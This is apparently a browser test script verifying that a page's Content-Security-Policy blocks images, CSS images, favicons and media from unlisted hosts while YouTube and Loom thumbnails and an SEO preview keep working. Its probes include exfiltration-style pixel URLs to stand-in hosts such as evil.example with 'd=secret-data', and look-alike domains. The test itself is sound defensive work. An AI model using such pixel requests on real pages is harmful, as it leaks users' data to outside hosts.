// S2-C3: the REAL <meta> img-src / media-src of index.html is enforced by the browser (the harness serves the file unchanged).
import { b, check, errs, fresh, signIn, results, srv } from './w5-harness.mjs';
const { ctx, pg } = await fresh();
const GIF = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
const served = []; const hits = [];
pg.on('request', r => hits.push(r.url()));
await ctx.route(/i\.ytimg\.com|cdn\.loom\.com|evil\.example|attacker\.test|other-cdn\.test/, r => { served.push(r.request().url()); r.fulfill({ status: 200, contentType: /mp[34]/.test(r.request().url()) ? 'audio/mpeg' : 'image/gif', headers: { 'access-control-allow-origin': '*' }, body: GIF }); });
await pg.evaluate(() => { window.__viol = []; document.addEventListener('securitypolicyviolation', e => window.__viol.push(e.effectiveDirective + ' ' + e.blockedURI)); });
const img = u => pg.evaluate(u => new Promise(res => { const i = new Image(); i.onload = () => res('ok'); i.onerror = () => res('blocked'); i.src = u; setTimeout(() => res('timeout'), 4000); }), u);

// ---- 1. the policy in the page
const pol = await pg.evaluate(() => window.coreCsp.parse(window.coreCsp.metaText()));
check("img-src is self, data:, blob: and the two thumbnail hosts; no https:, no *", JSON.stringify(pol['img-src']) === JSON.stringify(["'self'", 'data:', 'blob:', 'https://i.ytimg.com', 'https://cdn.loom.com']), pol['img-src'].join(' '));
check("media-src is 'none'", JSON.stringify(pol['media-src']) === JSON.stringify(["'none'"]));
check('connect-src is unchanged by this phase (12 hosts + self; the 3 App Check hosts came with SE-E1)', pol['connect-src'].length === 13 && !pol['connect-src'].includes('https:'));

// ---- 2. pictures: allowed kinds load, everything else is stopped by the browser itself
const PNG = 'data:image/gif;base64,' + GIF.toString('base64');
check('allowed: own file (assets/)', await img('assets/images/hero/hero-portrait.webp') === 'ok');
check('allowed: data: picture', await img(PNG) === 'ok');
check('allowed: blob: picture', await pg.evaluate(async d => { const bin = atob(d.split(',')[1]), arr = new Uint8Array(bin.length); for (let k = 0; k < bin.length; k++) arr[k] = bin.charCodeAt(k); const bl = new Blob([arr], { type: 'image/gif' }); const u = URL.createObjectURL(bl); return await new Promise(res => { const i = new Image(); i.onload = () => res(true); i.onerror = () => res(false); i.src = u; }); }, PNG));
check('allowed: i.ytimg.com', await img('https://i.ytimg.com/vi/abc/hqdefault.jpg') === 'ok');
check('allowed: cdn.loom.com', await img('https://cdn.loom.com/sessions/thumbnails/' + 'a'.repeat(32) + '-with-play.gif') === 'ok');
const bad = ['https://evil.example/pixel.gif?d=secret-data', 'https://attacker.test/x.png', 'https://i.ytimg.com.evil.example/x.gif', 'https://img.ytimg.com/x.gif', 'http://i.ytimg.com/x.gif', 'https://cdn.loom.com:8443/x.gif', 'https://other-cdn.test/x.gif'];
await pg.evaluate(() => { window.__viol.length = 0; }); served.length = 0;
for (const u of bad) check('blocked: ' + u.replace(/\?.*/, ''), await img(u) === 'blocked');
check('the browser reported every block, as img-src', await pg.evaluate(n => window.__viol.length >= n && window.__viol.every(v => v.startsWith('img-src')), bad.length), JSON.stringify(await pg.evaluate(() => window.__viol)));
check('no blocked picture request was ever served (nothing left the page)', !served.some(u => /evil\.example|attacker\.test|other-cdn|i\.ytimg\.com\.evil|img\.ytimg|:8443|^http:/.test(u)), served.join(' '));

// ---- 3. other ways of loading a picture or media go through the same rules
await pg.evaluate(() => { window.__viol.length = 0; }); served.length = 0;
await pg.evaluate(async () => {
  const d = document.createElement('div'); d.id = 'cssprobe'; d.style.cssText = 'width:10px;height:10px;background-image:url(https://evil.example/css-bg.gif?d=1)'; document.body.append(d);
  const l = document.createElement('div'); l.style.cssText = 'width:10px;height:10px;list-style-image:url(https://attacker.test/list.gif)'; document.body.append(l);
  new Audio('https://evil.example/a.mp3').load(); new Audio('https://i.ytimg.com/vi/a.mp3').load(); const v = document.createElement('video'); v.src = location.pathname; v.load(); const a2 = document.createElement('audio'); a2.src = 'data:audio/wav;base64,UklGRg=='; a2.load();
  const f = document.createElement('link'); f.rel = 'icon'; f.href = 'https://evil.example/fav.ico'; document.head.append(f);
  await new Promise(r => setTimeout(r, 800));
});
const viol = await pg.evaluate(() => window.__viol);
check('CSS background-image to another host is blocked (img-src)', viol.some(v => /img-src https:\/\/evil\.example\/css-bg/.test(v)), JSON.stringify(viol));
check('CSS list-style-image to another host is blocked (img-src)', viol.some(v => /img-src https:\/\/attacker\.test\/list/.test(v)));
check('audio and video sources are all blocked (media-src none): evil host, an allowed picture host, own file and data:', ['evil.example/a.mp3', 'i.ytimg.com/vi/a.mp3'].every(h => viol.some(v => v.startsWith('media-src') && v.includes(h))) && viol.filter(v => v.startsWith('media-src')).length >= 4, JSON.stringify(viol));
check('a page icon from another host is blocked', viol.some(v => /img-src https:\/\/evil\.example\/fav/.test(v)));
check('none of it was served', !served.some(u => /evil\.example|attacker\.test/.test(u)) && !served.some(u => /vi\/a\.mp3/.test(u)), served.join(' '));

// ---- 4. the Videos section still shows its thumbnails (YouTube and Loom)
await pg.evaluate(() => window.__viol.length = 0); served.length = 0;
await pg.evaluate(() => window.videosApi.set([{ id: 'y1', url: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ', title: 'YT', description: '', category: '', enabled: true }, { id: 'l1', url: 'https://www.loom.com/share/' + 'b'.repeat(32), title: 'LM', description: '', category: '', enabled: true }], 'grid'));
await pg.waitForTimeout(300);
await pg.evaluate(() => { const bx = document.getElementById('vidsBox'); bx.hidden = false; bx.scrollIntoView(); document.querySelectorAll('#vidsGrid img').forEach(i => { i.loading = 'eager'; }); });
for (const i of [0, 1]) { await pg.evaluate(i => { const im = document.querySelectorAll('#vidsGrid img')[i]; if (im) im.scrollIntoView(); }, i); await pg.waitForTimeout(700); }
check('Videos: thumbnails requested from i.ytimg.com and cdn.loom.com', served.some(u => /i\.ytimg\.com\/vi\/dQw4w9WgXcQ\/hqdefault\.jpg/.test(u)) && served.some(u => /cdn\.loom\.com\/sessions\/thumbnails\/b{32}-with-play\.gif/.test(u)), served.join(' '));
check('Videos: no violation from the thumbnails', (await pg.evaluate(() => window.__viol.length)) === 0, JSON.stringify(await pg.evaluate(() => window.__viol)));

// ---- 5. owner SEO preview: outside links get a note instead of a preview, assets/ links still preview
await signIn(pg); await pg.waitForTimeout(400); await pg.click('#dashOpen'); await pg.waitForTimeout(300); await pg.click('.dnav [data-page=seo]'); await pg.waitForTimeout(400);
const setImg = async v => { await pg.fill('#seoImg', v); await pg.dispatchEvent('#seoImg', 'input'); await pg.waitForTimeout(250); };
const st = () => pg.evaluate(() => ({ note: !document.getElementById('pvSiNote').hidden, imgHidden: document.getElementById('pvSi').hidden, src: document.getElementById('pvSi').getAttribute('src') }));
await pg.evaluate(() => window.__viol.length = 0); served.length = 0;
await setImg('https://evil.example/share-image.jpg');
let s = await st();
check('SEO: an outside image link shows the note, no picture, no request', s.note && s.imgHidden && !s.src && !served.some(u => /evil\.example/.test(u)) && (await pg.evaluate(() => window.__viol.length)) === 0, JSON.stringify(s));
check('SEO: the note text explains it', /isn.t available for outside image links/.test(await pg.textContent('#pvSiNote')) && /still saved/.test(await pg.textContent('#pvSiNote')));
check('SEO: the typed link is kept in the field and in the generated tags', (await pg.inputValue('#seoImg')) === 'https://evil.example/share-image.jpg' && /og:image" content="https:\/\/evil\.example\/share-image\.jpg"/.test(await pg.inputValue('#seoCode')), await pg.inputValue('#seoCode'));
await setImg('assets/images/social/og-image.jpg'); s = await st();
check('SEO: an assets/ path still previews', !s.note && !s.imgHidden && /assets\/images\/social\/og-image\.jpg$/.test(s.src || ''), JSON.stringify(s));
await setImg('https://evil.example/another.png'); s = await st();
check('SEO: going back to an outside link hides the picture again', s.note && s.imgHidden && !s.src);
check('page errors: ' + JSON.stringify(errs), errs.length === 0);
const badN = results.filter(r => !r[1]).length; console.log(badN ? 'SOME FAILED' : 'ALL PASSED');
await b.close(); srv.close();
